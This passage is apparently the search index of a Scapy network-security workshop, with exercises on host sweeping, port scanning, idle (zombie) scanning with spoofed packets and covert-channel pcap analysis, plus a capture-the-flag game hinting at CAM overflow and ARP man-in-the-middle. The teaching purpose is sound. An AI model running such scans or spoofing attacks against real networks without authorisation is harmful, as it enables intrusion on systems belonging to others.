IPIDs stored in data structure for patterns.\n\n\n\n\nExercise 4\n\n\nIP ID scanner\n\n\n\n\nYour might have found a potential \nzombie\n from the previous scan.\n\n\nWrite a script that takes a zombie_ip, victim_ip. victim_port Performs a ipid scan.(Details in the notes)\n\n\n\n\nFor more detailed discussion: \nIdle scan\n \n\n\nExample:\n\n\nverax@untamed $ sudo python ipidscanner.py 192.168.56.102 192.168.56.103 4444\n\n[+] Sending syn-ack to zombie\n[+] Recording initial IPID\n\n[+] Sending spoofed syn to victim\n\n[+] Sending syn-ack to zombie\n[+] Recording final IPID\n\n[*] Initial IPID of zombie: 14\n[*] Final IPID of zombie: 16\n\nThe port 4444 on 192.168.56.103 is open\n\n\n\n\nPython/Scapy tips:\n\n\n\n\nUse \nsr1\nor \nsend\n to send packets\n\n\nsend\n \nsr1\n and other packet sending functions take an extra argument \nverbose\n, set \nverbose=0\n to avoid scapy output.\n\n\n\n\nSolution:\n\n\nidle scan consists of three steps that are repeated for each port:\n\n\n\n\n\n\nProbe the zombie\ns IPID and record it. (Send a syn-ack to zombie, record ipid in response)\n\n\n\n\n\n\nForge a SYN packet with zombie IP as source and victim IP, victim port as destination. \n\n\n\n\n\n\nProbe the zombie\ns IP ID again. The target port state is then determined by comparing this new IP ID with the one recorded in step 1.\n\n\n\n\n\n\nAt this point, if the \nzombie\ns IPID increased by one\n that the zombie hasn\nt sent out any packets, except for its reply to the attacker\ns probe. THis is an indication that the target port might be closed on victim.\n\n\n\n\n\n\nIf the \nzombie\ns IPID increased by two\n, it means the zombie sent out a packet between the two probes. This is an indication that the target port is open on the victim.\n\n\n\n\n\n\nIf zombie IPIP increases by more than two, it usually indicates a bad zombie host. It might not have predictable IPID numbers, or might be engaged in communication unrelated to the idle scan.\n\n\n\n\n\n\nExercise 5\n\n\nPacket hunting\n\n\n\n\nYou are given a PCAP \nboston2016\n, this PCAP is suspected to be having covert channel activity. (someone trying to transfer data in packet using unsual methods).\n\n\nYour task is to analyze this packet capture and find out the hidden data.\n\n\n\n\nPython/Scapy tips:\n\n\n\n\nrdpcap\n to read a pcap.\n\n\npacket[protocol]\n to extract protocol specific content.\n\n\npacket[protocol].field\n to extract field\n\n\nformat(text,'04x')\n is how you format into proper hex format in Python.\n\n\nUse join method to joing elements of a list \n\".\".join([192, 168, 99, 24])\n \n 192.168.99.24\n\n\n\n\nSolution hints I:\n\n\nThis is not a packet analysis or CTF class so I\nll describe the solution in plain terms here, try to codify it using Scapy.\n\n\n\n\nThe covert activity might be happening through UDP checksums.\n\n\n\n\nSolution hints II:\n\n\nSpoilers ahead\n\n\n\n\nThe data is being exfiltrated by one party through checksums.\n\n\nTo be specific, UDP checksums in DNS queries is where the data is. - Extract the checksums from DNS queries.\n\n\nYou have to read the checksums in \n0x:(hex) format first. \nformat(text,'0x')\n\n\nDecode the hex checksums into ascii and that\ns the exfiltrated data.\n\n\n\n\nExercise 6\n\n\nPacket analysis\n\n\n\n\nGiven a pcap file, find all the unique hosts in that pcap file and try and determine their OS.\n\n\n\n\nverax@humla $ python list_scan.py evidence.pcap\n\nList of all the hosts and possible OS\n-------------------------------------\n192.168.56.0   - Linux\n45.65.29.124   - Windows\n198.56.101.2   - Linux\n\n\n\n\nExercise 7\n\n\nDummy network scanner\n\n\n\n\n\n\nA client wants you to do a security audit on their network. Client provided you with a network range to scan and set of IP addresses to exclude from scan.\n\n\n\n\n\n\nBefore you run an actual network scan, write a script that lists all the IP addresses that falls under scan(similar to Nmap list scan). (Network range provided by client minus IP addresses to be excluded)\n\n\n\n\n\n\nBoilerplate syntax is provided, can be found in code directory\n\n\nExample:\n\n\nverax@humla $ python list_scan.py --range 192.168.56.1/30 --exclude 192.168.56.2\nRange   =\n IPSet(['192.168.56.1/30'])\nExclude =\n IPSet(['192.168.56.2/32'])\n192.168.56.0\n192.168.56.1\n192.168.56.3\n\n\n\n\n\n\nHints:\n\n\n\n\nnetaddr\n library deals with Layer 3 addressing.\n\n\nnetaddr.IPSet\n has a remove method to remove elements.\n\n\n\n\n\n\nExercise 8\n\n\nLocal network interface enumeration.\n\n\n\n\nUse a python library to list all the interfaces on your machine, find as much as you can(interface labels, addressing etc).\n\n\nWhen you print the output, make sure it\ns easily readable.\n\n\n\n\nHints:\n\n\n\n\nnetifaces\n helps enumerate local interfaces.\n\n\nstring \n.format\n method and \npprint\n helps you print stuff beautifully in Python.", 
            "title": "Misc exercises"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#miscellaneous-exercises", 
            "text": "", 
            "title": "Miscellaneous exercises"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#exercise-1", 
            "text": "", 
            "title": "Exercise 1"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#network-sweeping", 
            "text": "Write a script to perform network sweeping i.e. given a IP address range, find all the machines that are alive.  Use any of the host discovery techniques that have been discussed but ARP tends to be neat and faster on local networks.   verax@untamed  $ sudo python hd_tcp_syn.py 192.168.56.99-110\n 192.168.56.102 is alive\n 192.168.56.103 is alive\n 192.168.56.107 is alive", 
            "title": "Network sweeping"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#exercise-2", 
            "text": "", 
            "title": "Exercise 2"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#port-scanning", 
            "text": "Write a script to perform port scanning i.e. given an IP address, find status of ports on the machine(atleast find any open ports under 1024).  Use any of the port scanning techniques that have been discussed.   verax@untamed  $ sudo python tcp_syn_scan.py 192.168.56.107\n'ftp_data    RA'\n'21          RA\n'ssh         SA'\n'telnet      RA'\n'24          RA'", 
            "title": "Port scanning"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#exercise-3", 
            "text": "", 
            "title": "Exercise 3"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#ip-id-pattern-finder", 
            "text": "Write a script that takes a target IP and checks for patterns in the IP ID generation.  Basic checks include: if the IP IDs generated are: all zeros, are all constant, are all randomized or if they are incremental.   Example:  verax@humla $ sudo python ipidseq.py 192.168.56.101\n\nTarget =  192.168.56.101\n\n[+] Sending packets to the target\n[+] Analyzing the IPID pattern\n[*] IPID generation pattern on scanme.nmap.org is randomized", 
            "title": "IP ID pattern finder"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#pythonscapy-tips", 
            "text": "Use  sr1 for sending packet and recieving first response  Python has in-built function  all()  that comes handy when comparing elements in list. Looking at below examples, think about how you can use it to do other comparisions.    lis = [0,0,0,0]  all(v == 0 for v in lis)       # Checking if all elements in list are zero\nTrue    lis = [1,4,6,9,22,65,98,354]    all(x y for x, y in zip(lis, lis[1:]))  # Checking if the elements are in increasing order\nTrue  More on Python s  any()  and  all() :  Any and all    check-list-monotonicity in Python    How do Python s any and all functions work?", 
            "title": "Python/Scapy tips:"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#solution-hints-i", 
            "text": "Send packets to target IP address, save the IPIDs from responses in a data structure. (looping might help)  Compare the IPIDs stored in data structure for patterns.", 
            "title": "Solution hints I:"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#exercise-4", 
            "text": "", 
            "title": "Exercise 4"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#ip-id-scanner", 
            "text": "Your might have found a potential  zombie  from the previous scan.  Write a script that takes a zombie_ip, victim_ip. victim_port Performs a ipid scan.(Details in the notes)   For more detailed discussion:  Idle scan    Example:  verax@untamed $ sudo python ipidscanner.py 192.168.56.102 192.168.56.103 4444\n\n[+] Sending syn-ack to zombie\n[+] Recording initial IPID\n\n[+] Sending spoofed syn to victim\n\n[+] Sending syn-ack to zombie\n[+] Recording final IPID\n\n[*] Initial IPID of zombie: 14\n[*] Final IPID of zombie: 16\n\nThe port 4444 on 192.168.56.103 is open", 
            "title": "IP ID scanner"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#pythonscapy-tips_1", 
            "text": "Use  sr1 or  send  to send packets  send   sr1  and other packet sending functions take an extra argument  verbose , set  verbose=0  to avoid scapy output.", 
            "title": "Python/Scapy tips:"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#solution", 
            "text": "idle scan consists of three steps that are repeated for each port:    Probe the zombie s IPID and record it. (Send a syn-ack to zombie, record ipid in response)    Forge a SYN packet with zombie IP as source and victim IP, victim port as destination.     Probe the zombie s IP ID again. The target port state is then determined by comparing this new IP ID with the one recorded in step 1.    At this point, if the  zombie s IPID increased by one  that the zombie hasn t sent out any packets, except for its reply to the attacker s probe. THis is an indication that the target port might be closed on victim.    If the  zombie s IPID increased by two , it means the zombie sent out a packet between the two probes. This is an indication that the target port is open on the victim.    If zombie IPIP increases by more than two, it usually indicates a bad zombie host. It might not have predictable IPID numbers, or might be engaged in communication unrelated to the idle scan.", 
            "title": "Solution:"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#exercise-5", 
            "text": "", 
            "title": "Exercise 5"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#packet-hunting", 
            "text": "You are given a PCAP  boston2016 , this PCAP is suspected to be having covert channel activity. (someone trying to transfer data in packet using unsual methods).  Your task is to analyze this packet capture and find out the hidden data.", 
            "title": "Packet hunting"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#pythonscapy-tips_2", 
            "text": "rdpcap  to read a pcap.  packet[protocol]  to extract protocol specific content.  packet[protocol].field  to extract field  format(text,'04x')  is how you format into proper hex format in Python.  Use join method to joing elements of a list  \".\".join([192, 168, 99, 24])    192.168.99.24", 
            "title": "Python/Scapy tips:"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#solution-hints-i_1", 
            "text": "This is not a packet analysis or CTF class so I ll describe the solution in plain terms here, try to codify it using Scapy.   The covert activity might be happening through UDP checksums.", 
            "title": "Solution hints I:"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#solution-hints-ii", 
            "text": "Spoilers ahead   The data is being exfiltrated by one party through checksums.  To be specific, UDP checksums in DNS queries is where the data is. - Extract the checksums from DNS queries.  You have to read the checksums in  0x:(hex) format first.  format(text,'0x')  Decode the hex checksums into ascii and that s the exfiltrated data.", 
            "title": "Solution hints II:"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#exercise-6", 
            "text": "", 
            "title": "Exercise 6"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#packet-analysis", 
            "text": "Given a pcap file, find all the unique hosts in that pcap file and try and determine their OS.   verax@humla $ python list_scan.py evidence.pcap\n\nList of all the hosts and possible OS\n-------------------------------------\n192.168.56.0   - Linux\n45.65.29.124   - Windows\n198.56.101.2   - Linux", 
            "title": "Packet analysis"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#exercise-7", 
            "text": "", 
            "title": "Exercise 7"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#dummy-network-scanner", 
            "text": "A client wants you to do a security audit on their network. Client provided you with a network range to scan and set of IP addresses to exclude from scan.    Before you run an actual network scan, write a script that lists all the IP addresses that falls under scan(similar to Nmap list scan). (Network range provided by client minus IP addresses to be excluded)    Boilerplate syntax is provided, can be found in code directory", 
            "title": "Dummy network scanner"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#example", 
            "text": "verax@humla $ python list_scan.py --range 192.168.56.1/30 --exclude 192.168.56.2\nRange   =  IPSet(['192.168.56.1/30'])\nExclude =  IPSet(['192.168.56.2/32'])\n192.168.56.0\n192.168.56.1\n192.168.56.3", 
            "title": "Example:"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#hints", 
            "text": "netaddr  library deals with Layer 3 addressing.  netaddr.IPSet  has a remove method to remove elements.", 
            "title": "Hints:"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#exercise-8", 
            "text": "", 
            "title": "Exercise 8"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#local-network-interface-enumeration", 
            "text": "Use a python library to list all the interfaces on your machine, find as much as you can(interface labels, addressing etc).  When you print the output, make sure it s easily readable.", 
            "title": "Local network interface enumeration."
        }, 
        {
            "location": "/exercises/misc_exercises/index.html#hints_1", 
            "text": "netifaces  helps enumerate local interfaces.  string  .format  method and  pprint  helps you print stuff beautifully in Python.", 
            "title": "Hints:"
        }, 
        {
            "location": "/exercises/network_hunt/index.html", 
            "text": "Let\ns go Network hunting!\n\n\nTrivia\n\n\n\n\n\n\nTerminal-based game in which you will use common network attack vectors and penetration testing methods to analyze and compromise a virtual network.\n\n\n\n\n\n\nInvolves Network Security challenges designed to educate users on packet manipulation and common network attacks.\n\n\n\n\n\n\nThe whole challenge happens over sort of a software defined network(SDN).\n\n\n\n\n\n\nOriginally created by James Sullivan(MIT License), modified by us for a workshop setting.\n\n\n\n\n\n\n\n\nNetwork Hunt\n\n\n\n\nThe network hunt is a simple Software Defined Network \n\n\nThe network is completely defined by handcrafted packets using scapy/python which simulates a typical network setup.\n\n\n\n\n\n\nThe Goal\n\n\nThere is an FTP server somewhere on the network containing a document:\n\n\n\n\nLocate the FTP server\n\n\nConnect to the service \n\n\nRetrieve the file!\n\n\n\n\nTools\n\n\n\n\nscapy\n\n\nnmap\n\n\nwireshark or maybe \nwireshark\n\n\ntelnet/nc\n\n\ndsniff\n\n\n\n\nConcepts\n\n\n\n\nBash terminal-fu\n\n\nPacket capture and manipulation in scapy\n\n\nPacket analysis in wireshark\n\n\nRouter modes of operation\n\n\nNetwork topography, gateways\n\n\nBasic telnet/nc commands\n\n\n\n\n\n\nHints\n\n\n\n\nYou may need to find a way to see all of the traffic on the network.\n\n\nOther clients on the network might give you useful clues, if you can coerce them.\n\n\nThe target will most likely be isolated from the immediate local network, and will have some preferred clients.\n\n\n\n\n\n\nChoose your difficulty\n\n\nIn general the goal is to retrive FTP payload from the target system. You choose how difficult/challenging you want this exercise to be.\n\n\nMega Pwn\n\n\nRun the script, crack the challenge without looking at any further hints/tasks.\n\n\nFull Pwn\n\n\nRun the script, read through the tasks mentioned below for help and crack the challange\n\n\nMedium Pwn\n\n\n\n\nRun the script, read through the tasks mentioned below for help.\n\n\nIf you still find it challenging(which is fine), ask for the solution file, you\nll be provided with a file that has more in-depth discussion on the steps towards cracking the challenge.\n\n\n\n\nMini pwn\n\n\n\n\nUse the tasks, solutin file and take a look at the challenge source code to understand how things work and crack the challenge.\n\n\n\n\nTASKS\n\n\nTASK - I\n\n\nRun the script \n find the details about the new interface(\nipconfig\n, \nroute\n).\n\n\nTASK - II\n\n\nUnderstand the network.\n\n\n\n\nIs there any traffic on the network?\n\n\nAre there devices connected to the network? Perform a network sweep?\n\n\n\n\nTASK - III\n\n\n\n\nHow to gain access to traffic beyond a switch?\n\n\nThink about exploiting the way layer 2 switches operate.\n\n\n\n\nScapy tips:\n\n- RandMAC() - Generates random MAC addresses.\n\n- RandIP() - Generates random IP addresses. \n\n\nTASK - IV\n\n\n\n\nWere you able to gain access to traffic beyond switch? If so, is there something interesting about the traffic? Is there some strange pattern in the traffic? \n\nHint: Port knocking. (Reference docs has more details on what port knocking is)\n\n\n\n\nTASK - V\n\n\nDid you manage to get access to some service on some machine? try some standard commands for that service to get more hints.\n\n\nTASK - VI\n\n\nThe target is not in the same sub-network and also accepts connections from only specific machines.How do you compromise the machine? \n\nHint: ARP MitM\n\n\nTASK - VIII\n\n\nRetrive the payload using standard FTP commands.", 
            "title": "Network Hunt"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#lets-go-network-hunting", 
            "text": "", 
            "title": "Let's go Network hunting!"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#trivia", 
            "text": "Terminal-based game in which you will use common network attack vectors and penetration testing methods to analyze and compromise a virtual network.    Involves Network Security challenges designed to educate users on packet manipulation and common network attacks.    The whole challenge happens over sort of a software defined network(SDN).    Originally created by James Sullivan(MIT License), modified by us for a workshop setting.     Network Hunt   The network hunt is a simple Software Defined Network   The network is completely defined by handcrafted packets using scapy/python which simulates a typical network setup.", 
            "title": "Trivia"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#the-goal", 
            "text": "There is an FTP server somewhere on the network containing a document:   Locate the FTP server  Connect to the service   Retrieve the file!", 
            "title": "The Goal"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#tools", 
            "text": "scapy  nmap  wireshark or maybe  wireshark  telnet/nc  dsniff", 
            "title": "Tools"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#concepts", 
            "text": "Bash terminal-fu  Packet capture and manipulation in scapy  Packet analysis in wireshark  Router modes of operation  Network topography, gateways  Basic telnet/nc commands    Hints   You may need to find a way to see all of the traffic on the network.  Other clients on the network might give you useful clues, if you can coerce them.  The target will most likely be isolated from the immediate local network, and will have some preferred clients.", 
            "title": "Concepts"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#choose-your-difficulty", 
            "text": "In general the goal is to retrive FTP payload from the target system. You choose how difficult/challenging you want this exercise to be.", 
            "title": "Choose your difficulty"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#mega-pwn", 
            "text": "Run the script, crack the challenge without looking at any further hints/tasks.", 
            "title": "Mega Pwn"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#full-pwn", 
            "text": "Run the script, read through the tasks mentioned below for help and crack the challange", 
            "title": "Full Pwn"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#medium-pwn", 
            "text": "Run the script, read through the tasks mentioned below for help.  If you still find it challenging(which is fine), ask for the solution file, you ll be provided with a file that has more in-depth discussion on the steps towards cracking the challenge.", 
            "title": "Medium Pwn"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#mini-pwn", 
            "text": "Use the tasks, solutin file and take a look at the challenge source code to understand how things work and crack the challenge.", 
            "title": "Mini pwn"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#tasks", 
            "text": "", 
            "title": "TASKS"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#task-i", 
            "text": "Run the script   find the details about the new interface( ipconfig ,  route ).", 
            "title": "TASK - I"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#task-ii", 
            "text": "Understand the network.   Is there any traffic on the network?  Are there devices connected to the network? Perform a network sweep?", 
            "title": "TASK - II"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#task-iii", 
            "text": "How to gain access to traffic beyond a switch?  Think about exploiting the way layer 2 switches operate.   Scapy tips: \n- RandMAC() - Generates random MAC addresses. \n- RandIP() - Generates random IP addresses.", 
            "title": "TASK - III"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#task-iv", 
            "text": "Were you able to gain access to traffic beyond switch? If so, is there something interesting about the traffic? Is there some strange pattern in the traffic?  \nHint: Port knocking. (Reference docs has more details on what port knocking is)", 
            "title": "TASK - IV"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#task-v", 
            "text": "Did you manage to get access to some service on some machine? try some standard commands for that service to get more hints.", 
            "title": "TASK - V"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#task-vi", 
            "text": "The target is not in the same sub-network and also accepts connections from only specific machines.How do you compromise the machine?  \nHint: ARP MitM", 
            "title": "TASK - VI"
        }, 
        {
            "location": "/exercises/network_hunt/index.html#task-viii", 
            "text": "Retrive the payload using standard FTP commands.", 
            "title": "TASK - VIII"
        }, 
        {
            "location": "/epilogue/moving_forward/index.html", 
            "text": "Moving forward\n\n\n\n\nScapy project needs more contributors.\n\n\nThere is a lot of scope for improvement and it makes a great starting place for contributing to open source.\n\n\nImprove the documentation.\n\n\nWrite add-ons, protocol dissectors etc.\n\n\nFind a problem/technique/utility.. code it yourself!\n\n\n\n\nScapy github page is a good place to start \nScapy github - Issues\n\n\nFrom Scapy project maintainers:\n\n\n\n\nadd unit tests to protocols in contrib/ Some of them don\nt have any test. This is problematic when we make changes to the core;\n\n\ncheck that the documentation is still up to date with the code;\n\n\nmove examples from Scapy presentations to the documentation. According to some recent discussions I had, it seems that they are no synced.\n\n\n\n\nAnother option is to try to do something with Scapy, and either write functions to do it, or write a documentation to show how you did it, maybe as an iPython Notebook.", 
            "title": "Moving forward"
        }, 
        {
            "location": "/epilogue/moving_forward/index.html#moving-forward", 
            "text": "Scapy project needs more contributors.  There is a lot of scope for improvement and it makes a great starting place for contributing to open source.  Improve the documentation.  Write add-ons, protocol dissectors etc.  Find a problem/technique/utility.. code it yourself!   Scapy github page is a good place to start  Scapy github - Issues  From Scapy project maintainers:   add unit tests to protocols in contrib/ Some of them don t have any test. This is problematic when we make changes to the core;  check that the documentation is still up to date with the code;  move examples from Scapy presentations to the documentation. According to some recent discussions I had, it seems that they are no synced.   Another option is to try to do something with Scapy, and either write functions to do it, or write a documentation to show how you did it, maybe as an iPython Notebook.", 
            "title": "Moving forward"
        }, 
        {
            "location": "/epilogue/feedback/index.html", 
            "text": "Feedback \n Suggestions\n\n\n\n\nSlack channel\n\n\n\n\nCredits\n\n\nnull - The Open Security Community. \n |  \n \nhttp://swachalit.null.co.in/\n\nPhillipe Biondi for Scapy tool \n excellent literature on it.  \n |  \n \nhttp://secdev.org/\n\nJames Sullivan for his brilliant ScapyHunt program. \n |  \n \nhttps://github.com/JamesSullivan1/scapyHunt/\n\nPeople at packetstan esp. Judy Novak. \n |  \n \npacketstan.com\n\nReactOS open source operating system \n |  \n \nhttps://www.reactos.org/\n\nTom Christie, Dougal Matthews for the documentation generator \n |  \n \nmkdocs.org\n\n\nReferences\n\n\nScapy documentation \n presentations\n \n\n\nNmap book\n \n\n\nScapy notes by iphelix\n \n\n\nBoston2016 pcap discussion\n \n\n\nTaste of Scapy by Judy Novak\n [PDF] \n\n\nDetection of Promiscuous Nodes Using ARP Packets\n [PDF]\n\n\nCAM overflow attack - Hackpedia\n \n\n\nHow to arp spoof on Linux\n\n\nPassive OS fingerprinting", 
            "title": "Feedback"
        }, 
        {
            "location": "/epilogue/feedback/index.html#feedback-suggestions", 
            "text": "Slack channel", 
            "title": "Feedback &amp; Suggestions"
        }, 
        {
            "location": "/epilogue/feedback/index.html#credits", 
            "text": "null - The Open Security Community.   |     http://swachalit.null.co.in/ \nPhillipe Biondi for Scapy tool   excellent literature on it.    |     http://secdev.org/ \nJames Sullivan for his brilliant ScapyHunt program.   |     https://github.com/JamesSullivan1/scapyHunt/ \nPeople at packetstan esp. Judy Novak.   |     packetstan.com \nReactOS open source operating system   |     https://www.reactos.org/ \nTom Christie, Dougal Matthews for the documentation generator   |     mkdocs.org", 
            "title": "Credits"
        }, 
        {
            "location": "/epilogue/feedback/index.html#references", 
            "text": "Scapy documentation   presentations    Nmap book    Scapy notes by iphelix    Boston2016 pcap discussion    Taste of Scapy by Judy Novak  [PDF]   Detection of Promiscuous Nodes Using ARP Packets  [PDF]  CAM overflow attack - Hackpedia    How to arp spoof on Linux  Passive OS fingerprinting", 
            "title": "References"
        }
    ]
}